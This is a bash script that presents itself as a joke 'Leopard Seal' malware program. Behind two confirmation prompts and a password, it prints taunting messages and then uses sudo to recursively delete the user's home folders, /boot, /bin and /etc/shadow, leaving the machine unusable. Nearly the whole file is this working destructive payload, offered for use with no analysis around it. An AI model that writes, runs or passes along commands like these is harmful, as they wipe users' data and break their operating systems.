#!/bin/bash

DELAY=30 # Number of seconds to display results

failsafe() {
  clear
  echo "Exiting."
  sleep 2s
  exit
}

club_penguin() {
  clear
  echo "LEAPORD SEAL"
  sleep 3s
  echo ""
  echo "Uh Oh! The penguin has been eaten by the Leopard Seal!"
  sleep 3s
  echo ""
  echo "Hey."
  sleep 2s
  echo ""
  echo "I'm Ness."
  sleep 2s
  echo "The creator of this program."
  sleep 2s
  echo ""  
  echo "Now, you might be thinking:"
  sleep 2s
  echo "Ness, why are you blabbering on when you could be destroying my Linux PC?"
  sleep 4s
  echo ""
  echo "Well....."
  sleep 3s
  echo ""
  echo "I've been distracting you."
  sleep 1s
  echo -e "\v\nY \v\nO \v\nU \v\n' \v\nR \v\nE \v\nT \v\nO \v\nO \v\nL \v\nA \v\nT \v\nE"
  sleep 0.5s  
  echo -e "\v\nY \v\nO \v\nU \v\n' \v\nR \v\nE \v\nT \v\nO \v\nO \v\nL \v\nA \v\nT \v\nE"
  sleep 0.5s  
  echo -e "\v\nY \v\nO \v\nU \v\n' \v\nR \v\nE \v\nT \v\nO \v\nO \v\nL \v\nA \v\nT \v\nE"
  sleep 0.5s  
  echo -e "\v\nY \v\nO \v\nU \v\n' \v\nR \v\nE \v\nT \v\nO \v\nO \v\nL \v\nA \v\nT \v\nE"
  sleep 0.5s  
  echo -e "\v\nY \v\nO \v\nU \v\n' \v\nR \v\nE \v\nT \v\nO \v\nO \v\nL \v\nA \v\nT \v\nE"  
  cd ~
  chmod a+w Desktop
  sudo rm Desktop
  sleep 1s
  echo "See?"
  sleep 1s
  echo "BOOM! There goes your desktop."
  sleep 5s
  echo ""
  echo "You know what?"
  sleep 1s
  echo "I'm actually going to stop blabbering now."
  sleep 2s
  echo ""
  echo "Say bye bye to the penguin!"
  sleep 1s
  cd ~
  sudo chmod a+w Documents
  sudo chmod a+w Music
  sudo chmod a+w Pictures
  sudo chmod a+w Public
  sudo chmod a+w Templates
  sudo chmod a+w Videos
  sudo chmod a+w Downloads
  sudo rm -r Documents
  sudo rm -r Music
  sudo rm -r Pictures
  sudo rm -r Public
  sudo rm -r Templates
  sudo rm -r Videos
  sudo rm -r Downloads
  sleep 1s
  echo ""
  echo "Your PC is no more."
  sleep 2s
  echo ""
  echo "Welp, cya!"
  sleep 1s
  cd /
  sudo chmod a+w boot
  sudo rm -r boot
  sudo chmod a+w bin
  sudo rm -r bin
  cd etc
  sudo chmod a+w shadow
  sudo rm shadow
  sleep 1s
  exit
}

enter_name() {
  clear
  echo ""
  echo "                          Enter the name of this program:"
  echo ""
  echo ""
  echo ""
  echo ""
  echo ""
  echo -n "                            Program Name: "
  read selection
  clear
  echo ""
  case $selection in
    "Leopard Seal" ) clear ; club_penguin ;;
    * ) clear ; failsafe ;; 
esac
}

are_you_sure() {
  clear
  echo "ARE YOU SURE?"
  echo ""
  echo "Press 2 to proceed or press anything else to exit."
  echo ""
  read -n1 -s -r -p $'' key

if [ "$key" = '2' ]; then
  enter_name
else
    failsafe
  fi
}


while true; do 
  clear
echo "WARNING: THIS IS A MALWARE THAT WILL DELETE ALL DATA ON THIS PC."
echo "ARE YOU SURE YOU WANT TO PROCEED?" 
echo ""
echo "Press 4 to proceed or press anything else to exit."
echo ""

  read -n1 -s -r -p $'' key

if [ "$key" = '4' ]; then
  are_you_sure
else
    failsafe
  fi
done
echo "Exiting."
